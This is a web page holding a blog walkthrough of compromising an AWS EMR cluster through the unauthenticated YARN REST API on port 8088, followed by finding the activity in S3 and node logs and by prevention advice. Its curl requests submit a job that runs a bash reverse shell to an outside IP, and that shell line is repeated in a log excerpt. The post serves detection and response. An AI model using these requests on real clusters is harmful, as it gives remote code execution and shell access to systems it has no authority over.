<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>emr_security_woes | JellyParks</title><meta name=keywords content="aws,cloud,dfir"><meta name=description content="Walkthrough of Elastic Map Reduce compromise, and why it should never be directly exposed to the Internet."><meta name=author content="Travis"><link rel=canonical href=https://jellyparks.com/posts/emr-security-woes/><link crossorigin=anonymous href=/assets/css/stylesheet.min.9a6093ef6721cb73f74fc97e7e73df4d4e4d54b53acb6508b554b48f5f75b49a.css integrity="sha256-mmCT72chy3P3T8l+fnPfTU5NVLU6y2UItVS0j191tJo=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js integrity="sha256-uVus3DnjejMqn4g7Hni+Srwf3KK8HyZB9V4809q9TWE=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://jellyparks.com/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://jellyparks.com/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://jellyparks.com/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://jellyparks.com/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://jellyparks.com/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-13VPCR43BS"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-13VPCR43BS",{anonymize_ip:!1})}</script><meta property="og:title" content="emr_security_woes"><meta property="og:description" content="Walkthrough of Elastic Map Reduce compromise, and why it should never be directly exposed to the Internet."><meta property="og:type" content="article"><meta property="og:url" content="https://jellyparks.com/posts/emr-security-woes/"><meta property="og:image" content="https://jellyparks.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2018-11-28T00:00:00+00:00"><meta property="article:modified_time" content="2018-11-28T00:00:00+00:00"><meta property="og:site_name" content="JellyParks"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://jellyparks.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="emr_security_woes"><meta name=twitter:description content="Walkthrough of Elastic Map Reduce compromise, and why it should never be directly exposed to the Internet."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://jellyparks.com/posts/"},{"@type":"ListItem","position":3,"name":"emr_security_woes","item":"https://jellyparks.com/posts/emr-security-woes/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"emr_security_woes","name":"emr_security_woes","description":"Walkthrough of Elastic Map Reduce compromise, and why it should never be directly exposed to the Internet.","keywords":["aws","cloud","dfir"],"articleBody":" I recently had the opportunity to dig deeper into the Elastic Map Reduce (EMR) service in AWS. According to the official Amazon docs (here) “…EMR is a manged cluster platform that simlifies running big data frameworks…” Full disclosure I have virtually zero experience with big data and big data platforms. The closest I’ve gotten to that space is storing data in S3 and searching it with Athena. Oh, I also sometimes search enterprise Splunk without specifying an index or sourcetype. That counts right?\nThe reason I was digging into EMR was not to learn more about big data, hadoop, spark, etc. But instead it was to answer a few simple questions. How would someone compromise a cluster, and on the flip side, how could you detect it was compromised and what the attackers did after compromise.\nSetting Up a Cluster Amazon has done an amazing job at making it really easy to deploy an EMR cluster. In fact its just a few clicks and its up. Within the EMR section select create to create a cluster. Once the Create Cluster - Quick Options page loads configure your cluster to meet your needs. For this example select release emr-6.0.0 with Spark, Yarn, and Zeppelin.\nSelect the key pair to use for the instances which will be part of the cluster, and then click the Create Cluster button. A screenshot of the configuration setup is below.\nThe instances will spin up fairly quickly, the cluster will become fully operational in about 3-5 minutes. Once it’s ready the cluster status will be Waiting, Cluster Ready the green dot next to the cluster name will be solid green as pictured below\nIn order to access the cluster make sure to add a security group to the primary node which gives access to 8088. DO NOT EXPOSE THIS TO THE ENTIRE INTERNET. I cannot stress this enough, do not expose the port to entire Internet, only allow access from a trusted IP.\nCompromising EMR As it turns out with improper security configurations an EMR deployment can be compromised with a couple of curl requests or a quick python script.\nThe first request we need to make constructs a new application for us, and returns various meta details about the applicaiton.\ncurl --request POST 'PRIMARYHOST:8088/ws/v1/cluster/apps/new-applicaion' If successful we get a response similar to the one below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 { \"application-id\": \"application_1590702911576_0016\", \"maximum-resource-capability\": { \"memory\": 12288, \"vCores\": 4, \"resourceInformations\": { \"resourceInformation\": [ { \"maximumAllocation\": 9223372036854775807, \"minimumAllocation\": 0, \"name\": \"memory-mb\", \"resourceType\": \"COUNTABLE\", \"units\": \"Mi\", \"value\": 12288 }, { \"maximumAllocation\": 9223372036854775807, \"minimumAllocation\": 0, \"name\": \"vcores\", \"resourceType\": \"COUNTABLE\", \"units\": \"\", \"value\": 4 } ] } } } The main field we care about is the application-id field. The resource information is also important. We need to make sure that we do not request resources beyond the capacity of the resources allocted for the applications.\nThe next step is to execute the application. Within an exection request, we define additional parameters for the job. There are all kinds of configuration options such as resources to consume, commands to run, and a lot of other things that are well beyond the scope of this article. The POST request below will call our application and have it run a simple reverse shell:\ncurl --request POST 'PRIMARYHOST:8088/ws/v1/cluster/apps' \\ --header 'Accept: application/json' \\ --header 'Content-Type: application/json' \\ --data-raw '{ \"max-app-attempts\":2, \"am-container-sepc\":{ \"commands\":{ \"command\":\"/bin/bash -c \"bash -i \u003e\u0026 /dev/tcp/3.94.211.164/6767 0\u003e\u00261\"\" } }, \"application-id\":\"application_1590702911576_0016\", \"application-type\":\"YARN\", \"application-anem\":\"yupyup\" }' Once the curl request is made to run the application we can expect a 202 response with no data. A 202 response means the application run request was submitted successfully. It DOES NOT mean the application ran successfully. If there are any configuration errors or other errors the response is still going to be a 202. Just because the applicaiton was submitted successfully does not mean that it will be processed and executed succesfully.\nIn the web GUI at http://PRIMARYHOST:8088/cluster we see that the application ID we called to run will now have an execution history. The user will be dr.who because we created and called the application without authenticating. The other columns have details about various things such as the start times, launch times, etc. Even though the ‘State’ and ‘FinalStatus’ columns may say failed the shell code within the application was probably ran.\nLogging As an attacker we can confirm if this worked by checking to see if we have a shell from one of the nodes within the cluster, but how can we as defenders tell if the execution was successful? Good news, all of the activity above is logged. By digging into the logs a bit we should be able to tell what commands were executed and where they were executed at.\nWhen we setup the cluster we enabled logging to a S3 folder. All of our applications will log to this folder. If everything was left to the defaults the logging folder will be something similar to this: s3://aws-logs-ACCOUNT-us-east-1/elasticmapreduce/CLUSTER ID. Within this folder we can pull container logs out for each application. They’ll be in a subfolder similar to this /containers/application_1590702911576_0016/container_1590702911576_0016_02_000001/launch_container.sh.gz\nThe launch_container.sh log will have exection details for the application when it was called. In the log output below we can see that the last line contains the reverse shell code that we included in the POST request above when we ran our malicious applicaiton.\n... # Creating copy of launch script cp \"launch_container.sh\" \"/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/launch_container.sh\" chmod 640 \"/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/launch_container.sh\" # Determining directory contents echo \"ls -l:\" 1\u003e\"/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info\" ls -l 1\u003e\u003e\"/var/log/hadoop-yarn/containers/application_1590702911576_0015/container_1590702911576_0015_01_000001/directory.info\" echo \"find -L . -maxdepth 5 -ls:\" 1\u003e\u003e\"/var/log/hadoop-yarn/containers/application_1590702911576_0015/container_1590702911576_0015_01_000001/directory.info\" find -L . -maxdepth 5 -ls 1\u003e\u003e\"/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info\" echo \"broken symlinks(find -L . -maxdepth 5 -type l -ls):\" 1\u003e\u003e\"/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info\" find -L . -maxdepth 5 -type l -ls 1\u003e\u003e\"/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info\" echo \"Launching container\" exec /bin/bash -c \"bash -i \u003e\u0026 /dev/tcp/3.94.211.164/6767 0\u003e\u00261\" At this point we know what was ran, but we don’t know which node the malicious code was executed. This is going to be critical to discover so that we can conduct further analysis of the system to see what else the attacker did. To do this we need to change to a new directory within S3 to find the node logs. Node logs can be found here: node/NODE INSTANCE ID/applications/hadoop-yarn\nThese logs are local logs for each instance in the cluster and show all of the application submissions. A sample output is below.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 2020-06-20 20:09:04,277 INFO SecurityLogger.org.apache.hadoop.ipc.Server (Socket Reader #1 for port 8041): Auth successful for appattempt_1590702911576_0016_000001 (auth:SIMPLE) 2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.ContainerManagerImpl (IPC Server handler 32 on default port 8041): Start request for container_1590702911576_0016_01_000001 by user dr.who 2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.ContainerManagerImpl (IPC Server handler 32 on default port 8041): Creating a new application reference for app application_1590702911576_0016 2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl (NM ContainerManager dispatcher): Application application_1590702911576_0016 transitioned from NEW to INITING 2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.NMAuditLogger (IPC Server handler 32 on default port 8041): USER=dr.who IP=172.31.18.33 OPERATION=Start Container Request TARGET=ContainerManageImpl RESULT=SUCCESS APPID=application_1590702911576_0016 CONTAINERID=container_1590702911576_0016_01_000001 2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl (NM ContainerManager dispatcher): Adding container_1590702911576_0016_01_000001 to application application_1590702911576_0016 2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl (NM ContainerManager dispatcher): Application application_1590702911576_0016 transitioned from INITING to RUNNING 2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.container.ContainerImpl (NM ContainerManager dispatcher): Container container_1590702911576_0016_01_000001 transitioned from NEW to SCHEDULED 2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.AuxServices (NM ContainerManager dispatcher): Got event CONTAINER_INIT for appId application_1590702911576_0016 2020-06-20 20:09:04,292 INFO org.apache.spark.network.yarn.YarnShuffleService (NM ContainerManager dispatcher): Initializing container container_1590702911576_0016_01_000001 2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.scheduler.ContainerScheduler (NM ContainerManager dispatcher): Starting container [container_1590702911576_0016_01_000001] 2020-06-20 20:09:04,305 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.container.ContainerImpl (NM ContainerManager dispatcher): Container container_1590702911576_0016_01_000001 transitioned from SCHEDULED to RUNNING 2020-06-20 20:09:04,305 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl (NM ContainerManager dispatcher): Starting resource-monitoring for container_1590702911576_0016_01_000001 2020-06-20 20:09:05,867 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl (Container Monitor): container_1590702911576_0016_01_000001's ip = 172.31.22.26, and hostname = ip-172-31-22-26.ec2.internal 2020-06-20 20:09:05,873 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl (Container Monitor): Skipping monitoring container container_1590702911576_0016_01_000001 since CPU usage is not yet available. 2020-06-20 20:09:35,593 ERROR org.apache.hadoop.yarn.server.nodemanager.NodeStatusUpdaterImpl (Node Status Updater): NM node labels {} were not accepted by RM and message from RM : null On line 9 in the logs above we can see that the anonymous user ‘dr.who’ requested to start a container, the application ID, and the container ID for the particular request. On line 27 we can see the node within our cluster which ran the malicious application.\nAdditional logs can be found on the nodes themselves. Another way we can see activity is by pulling the hadoop-yarn-resourcemanager logs out of the primary server.\nWithin this log source we can see lines similar to the one below that show the resourcemanager assigning our malicious container container_1590702911576_0016_01_000001 work to the 172.31.22.26 host. This is a great way to determine which host(s) the malicious activity occured on.\n2020-06-20 20:09:04,269 INFO org.apache.hadoop.yarn.server.resourcemanager.scheduler.common.fica.FiCaSchedulerNode (SchedulerEventDispatcher:Event Processor): Assigned container container_1590702911576_0016_01_000001 of capacity memory:32, vCores:1 on host ip-172-31-22-26.ec2.internal:8041, which has 1 containers, memory:32, vCores:1 used and memory:12256, vCores:3 available after allocation Other helpful information can be pulled from this log source. The following log entry shows the initial application creation request:\n2020-06-20 20:09:04,216 INFO org.apache.hadoop.yarn.server.resourcemanager.RMAuditLogger (qtp677217562-27): USER=dr.who OPERATION=Submit Application Request TARGET=ClientRMService RESULT=SUCCESS APPID=application_1590702911576_0016 QUEUENAME=default Combining several other log entries from this file will show the entire lifecyle of the application. This is very helpful when attempting to pull together a detailed timeline of all the events.\nNext Steps Now that we have a general understanding of what occured, and where it occured we have to begin digging into the activity that occured on the node which spawned the reverse shell. If there are hundreds of application run requests they will all have to be examined. Without an understanding of each request it’s hard to say exactly what occured or which nodes were potentially compromised.\nPrevention Preventing this behavior is straight forward, do not expose EMR clusters to the Internet. Thats it. Make sure the security groups associated with each node in the cluster are scoped to the minium access required to manage and maintain the systems. There is even a GuardDuty alert Port Probe EMR Unprotected Port. That will fire if someone scans a sensitive port (8088).\nAdditional Resources Additional references, I leaned on these heavily while trying to better understand this space:\nHadoop YARN: An Assessment of the Attack Surface and Its Exploits Don’t let Dr.Who hijack your EMR cluster Hadoop Yarn hack? ","wordCount":"1727","inLanguage":"en","datePublished":"2018-11-28T00:00:00Z","dateModified":"2018-11-28T00:00:00Z","author":{"@type":"Person","name":"Travis"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://jellyparks.com/posts/emr-security-woes/"},"publisher":{"@type":"Organization","name":"JellyParks","logo":{"@type":"ImageObject","url":"https://jellyparks.com/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://jellyparks.com accesskey=h title="Home (Alt + H)">Home</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://jellyparks.com/posts title=all_posts><span>all_posts</span></a></li><li><a href=https://jellyparks.com/categories/ title=categories><span>categories</span></a></li><li><a href=https://jellyparks.com/tags/ title=tags><span>tags</span></a></li><li><a href=https://jellyparks.com/me/ title=me><span>me</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://jellyparks.com>Home</a>&nbsp;»&nbsp;<a href=https://jellyparks.com/posts/>Posts</a></div><h1 class=post-title>emr_security_woes</h1><div class=post-meta><span title='2018-11-28 00:00:00 +0000 UTC'>November 28, 2018</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;Travis&nbsp;|&nbsp;<a href=https://github.com/yogisec/yogisec.github.io/blob/main/content/posts/emr-security-woes/index.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#setting-up-a-cluster aria-label="Setting Up a Cluster">Setting Up a Cluster</a></li><li><a href=#compromising-emr aria-label="Compromising EMR">Compromising EMR</a></li><li><a href=#logging aria-label=Logging>Logging</a></li><li><a href=#next-steps aria-label="Next Steps">Next Steps</a></li><li><a href=#prevention aria-label=Prevention>Prevention</a></li><li><a href=#additional-resources aria-label="Additional Resources">Additional Resources</a></li></ul></div></details></div><div class=post-content><hr><p>I recently had the opportunity to dig deeper into the Elastic Map Reduce (EMR) service in AWS. According to the official Amazon docs (here) &ldquo;&mldr;EMR is a manged cluster platform that simlifies running big data frameworks&mldr;&rdquo; Full disclosure I have virtually zero experience with big data and big data platforms. The closest I&rsquo;ve gotten to that space is storing data in S3 and searching it with Athena. Oh, I also sometimes search enterprise Splunk without specifying an index or sourcetype. That counts right?</p><p>The reason I was digging into EMR was not to learn more about big data, hadoop, spark, etc. But instead it was to answer a few simple questions. How would someone compromise a cluster, and on the flip side, how could you detect it was compromised and what the attackers did after compromise.</p><hr><h3 id=setting-up-a-cluster>Setting Up a Cluster<a hidden class=anchor aria-hidden=true href=#setting-up-a-cluster>#</a></h3><p>Amazon has done an amazing job at making it really easy to deploy an EMR cluster. In fact its just a few clicks and its up. Within the EMR section select <code>create</code> to create a cluster. Once the <code>Create Cluster - Quick Options</code> page loads configure your cluster to meet your needs. For this example select release emr-6.0.0 with Spark, Yarn, and Zeppelin.</p><p>Select the key pair to use for the instances which will be part of the cluster, and then click the <code>Create Cluster</code> button. A screenshot of the configuration setup is below.</p><p><img loading=lazy src=images/create_cluster.png alt=create_cluster title=img-fluid></p><p>The instances will spin up fairly quickly, the cluster will become fully operational in about 3-5 minutes. Once it&rsquo;s ready the cluster status will be <code>Waiting, Cluster Ready</code> the green dot next to the cluster name will be solid green as pictured below</p><p><img loading=lazy src=images/cluster_ready.png alt=cluster_ready.png title=img-fluid></p><p>In order to access the cluster make sure to add a security group to the primary node which gives access to 8088. <strong>DO NOT EXPOSE THIS TO THE ENTIRE INTERNET</strong>. I cannot stress this enough, do not expose the port to entire Internet, only allow access from a trusted IP.</p><hr><h3 id=compromising-emr>Compromising EMR<a hidden class=anchor aria-hidden=true href=#compromising-emr>#</a></h3><p>As it turns out with improper security configurations an EMR deployment can be compromised with a couple of curl requests or a quick python script.</p><p>The first request we need to make constructs a new application for us, and returns various meta details about the applicaiton.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl --request POST <span class=s1>&#39;PRIMARYHOST:8088/ws/v1/cluster/apps/new-applicaion&#39;</span>
</span></span></code></pre></div><p>If successful we get a response similar to the one below:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=hl><span class=lnt> 2
</span></span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class="line hl"><span class=cl> <span class=nt>&#34;application-id&#34;</span><span class=p>:</span> <span class=s2>&#34;application_1590702911576_0016&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=nt>&#34;maximum-resource-capability&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;memory&#34;</span><span class=p>:</span> <span class=mi>12288</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;vCores&#34;</span><span class=p>:</span> <span class=mi>4</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;resourceInformations&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;resourceInformation&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>     <span class=nt>&#34;maximumAllocation&#34;</span><span class=p>:</span> <span class=mi>9223372036854775807</span><span class=p>,</span>
</span></span><span class=line><span class=cl>     <span class=nt>&#34;minimumAllocation&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>     <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;memory-mb&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>     <span class=nt>&#34;resourceType&#34;</span><span class=p>:</span> <span class=s2>&#34;COUNTABLE&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>     <span class=nt>&#34;units&#34;</span><span class=p>:</span> <span class=s2>&#34;Mi&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>     <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=mi>12288</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>     <span class=nt>&#34;maximumAllocation&#34;</span><span class=p>:</span> <span class=mi>9223372036854775807</span><span class=p>,</span>
</span></span><span class=line><span class=cl>     <span class=nt>&#34;minimumAllocation&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>     <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;vcores&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>     <span class=nt>&#34;resourceType&#34;</span><span class=p>:</span> <span class=s2>&#34;COUNTABLE&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>     <span class=nt>&#34;units&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>     <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=p>]</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>The main field we care about is the application-id field. The resource information is also important. We need to make sure that we do not request resources beyond the capacity of the resources allocted for the applications.</p><p>The next step is to execute the application. Within an exection request, we define additional parameters for the job. There are all kinds of configuration options such as resources to consume, commands to run, and a lot of other things that are well beyond the scope of this article. The POST request below will call our application and have it run a simple reverse shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl --request POST <span class=s1>&#39;PRIMARYHOST:8088/ws/v1/cluster/apps&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>--header <span class=s1>&#39;Accept: application/json&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>--header <span class=s1>&#39;Content-Type: application/json&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>--data-raw <span class=s1>&#39;{
</span></span></span><span class=line><span class=cl><span class=s1> &#34;max-app-attempts&#34;:2,
</span></span></span><span class=line><span class=cl><span class=s1> &#34;am-container-sepc&#34;:{
</span></span></span><span class=line><span class=cl><span class=s1>  &#34;commands&#34;:{
</span></span></span><span class=line><span class=cl><span class=s1>   &#34;command&#34;:&#34;/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/3.94.211.164/6767 0&gt;&amp;1&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s1>   }
</span></span></span><span class=line><span class=cl><span class=s1> },
</span></span></span><span class=line><span class=cl><span class=s1> &#34;application-id&#34;:&#34;application_1590702911576_0016&#34;,
</span></span></span><span class=line><span class=cl><span class=s1> &#34;application-type&#34;:&#34;YARN&#34;,
</span></span></span><span class=line><span class=cl><span class=s1> &#34;application-anem&#34;:&#34;yupyup&#34;
</span></span></span><span class=line><span class=cl><span class=s1>}&#39;</span>
</span></span></code></pre></div><p>Once the curl request is made to run the application we can expect a 202 response with no data. A 202 response means the application run request was submitted successfully. It DOES NOT mean the application ran successfully. If there are any configuration errors or other errors the response is still going to be a 202. Just because the applicaiton was submitted successfully does not mean that it will be processed and executed succesfully.</p><p>In the web GUI at <code>http://PRIMARYHOST:8088/cluster</code> we see that the application ID we called to run will now have an execution history. The user will be <code>dr.who</code> because we created and called the application without authenticating. The other columns have details about various things such as the start times, launch times, etc. Even though the &lsquo;State&rsquo; and &lsquo;FinalStatus&rsquo; columns may say failed the shell code within the application was probably ran.</p><p><img loading=lazy src=images/application_run.png alt=application_run title=img-fluid></p><hr><h3 id=logging>Logging<a hidden class=anchor aria-hidden=true href=#logging>#</a></h3><p>As an attacker we can confirm if this worked by checking to see if we have a shell from one of the nodes within the cluster, but how can we as defenders tell if the execution was successful? Good news, all of the activity above is logged. By digging into the logs a bit we should be able to tell what commands were executed and where they were executed at.</p><p>When we setup the cluster we enabled logging to a S3 folder. All of our applications will log to this folder. If everything was left to the defaults the logging folder will be something similar to this: <code>s3://aws-logs-ACCOUNT-us-east-1/elasticmapreduce/CLUSTER ID</code>. Within this folder we can pull container logs out for each application. They&rsquo;ll be in a subfolder similar to this <code>/containers/application_1590702911576_0016/container_1590702911576_0016_02_000001/launch_container.sh.gz</code></p><p>The <code>launch_container.sh</code> log will have exection details for the application when it was called. In the log output below we can see that the last line contains the reverse shell code that we included in the POST request above when we ran our malicious applicaiton.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Creating copy of launch script</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cp <span class=s2>&#34;launch_container.sh&#34;</span> <span class=s2>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/launch_container.sh&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>chmod <span class=m>640</span> <span class=s2>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/launch_container.sh&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Determining directory contents</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;ls -l:&#34;</span> 1&gt;<span class=s2>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ls -l 1&gt;&gt;<span class=s2>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0015/container_1590702911576_0015_01_000001/directory.info&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;find -L . -maxdepth 5 -ls:&#34;</span> 1&gt;&gt;<span class=s2>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0015/container_1590702911576_0015_01_000001/directory.info&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>find -L . -maxdepth <span class=m>5</span> -ls 1&gt;&gt;<span class=s2>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;broken symlinks(find -L . -maxdepth 5 -type l -ls):&#34;</span> 1&gt;&gt;<span class=s2>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>find -L . -maxdepth <span class=m>5</span> -type l -ls 1&gt;&gt;<span class=s2>&#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info&#34;</span>
